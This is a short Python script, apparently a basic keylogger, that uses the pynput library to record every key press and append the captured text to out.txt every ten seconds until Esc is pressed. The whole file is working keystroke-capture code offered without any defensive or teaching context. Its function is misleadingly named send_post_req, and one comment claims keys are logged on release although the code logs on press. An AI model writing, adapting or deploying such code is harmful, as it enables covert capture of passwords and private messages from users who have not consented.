
from pynput import keyboard
import threading

text = ""
time_interval = 10

def send_post_req():
    global text
    try:
        with open("out.txt", "a", encoding="utf-8") as archivo:
        
            archivo.write(text)
            text = ""
        
        timer = threading.Timer(time_interval, send_post_req)
        timer.start()
    except:
        print("Couldn't complete request!")

# We only need to log the key once it is released. That way it takes the modifier keys into consideration.
def on_press(key):
    global text

    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        return False
    else:
        # We do an explicit conversion from the key object to a string and then append that to the string held in memory.
        text += str(key).strip("'")


with keyboard.Listener(
    on_press=on_press) as listener:
    send_post_req()
    listener.join()